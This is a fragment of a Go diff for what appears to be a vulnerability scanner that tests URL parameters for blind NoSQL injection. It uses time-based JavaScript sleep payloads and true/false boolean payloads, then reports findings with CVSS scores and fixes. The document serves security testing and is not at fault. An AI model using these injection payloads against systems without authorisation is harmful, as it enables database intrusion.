+				`1';sleep(5000);||'1'=='1`,
+			}
+
+			for _, tp := range timePayloads {
+				// We need to encode the payload properly
+				qs := url.Values{}
+				qs.Set(param, tp)
+				timeAttackURL := fmt.Sprintf("%s?%s", targetURL, qs.Encode())
+
+				start := time.Now()
+				respTime, err := client.Get(timeAttackURL)
+				elapsed := time.Since(start)
+
+				if err == nil {
+					respTime.Body.Close()
+				}
+
+				// If it took > 5 seconds (with some jitter buffer), we have execution!
+				if elapsed > 4500*time.Millisecond {
+					return &Vulnerability{
+						Target:      target,
+						Name:        "Blind NoSQL Injection (Time-Based)",
+						Severity:    "CRITICAL",
+						CVSS:        9.8,
+						Description: fmt.Sprintf("The server slept for ~5 seconds when executing a JavaScript payload.\nThis confirms arbitrary JavaScript execution within the database.\nParam: %s\nPayload: %s", param, tp),
+						Solution:    "Disable server-side JavaScript execution (e.g., --noscript in MongoDB) and validate input.",
+						Reference:   "CWE-943 / OWASP Injection",
+					}
+				}
+			}
+
+			// ---------------------------------------------------------
+			// VECTOR 3: BOOLEAN INFERENCE (True/False Testing)
+			// Logic: Inject ' && 1==1 ' vs ' && 1==0 '
+			// ---------------------------------------------------------
+			// This is useful for NoSQL DBs that support expression evaluation
+
+			truePayload := `' && 1==1 && 'a'=='a`
+			falsePayload := `' && 1==0 && 'a'=='a`
+
+			qsTrue := url.Values{}
+			qsTrue.Set(param, truePayload)
+			qsFalse := url.Values{}
+			qsFalse.Set(param, falsePayload)
+
+			respTrue, errT := client.Get(targetURL + "?" + qsTrue.Encode())
+			respFalse, errF := client.Get(targetURL + "?" + qsFalse.Encode())
+
+			if errT == nil && errF == nil {
+				defer respTrue.Body.Close()
+				defer respFalse.Body.Close()
+
+				// If True returns 200 OK and False returns 500/404/Empty, we have control.
+				if respTrue.StatusCode == 200 && respFalse.StatusCode != 200 {
+					return &Vulnerability{
+						Target:      target,
+						Name:        "Blind NoSQL Injection (Boolean)",
+						Severity:    "HIGH",
+						CVSS:        8.0,
+						Description: fmt.Sprintf("Server responded differently to True/False logic injection.\nTrue Payload: 200 OK\nFalse Payload: %d %s", respFalse.StatusCode, http.StatusText(respFalse.StatusCode)),
+						Solution:    "Use parameterized queries and avoid string concatenation in NoSQL queries.",
 						Reference:   "OWASP NoSQL Injection",
 					}
 				}
 			}
 		}
 	}
+
 	return nil
 }
 
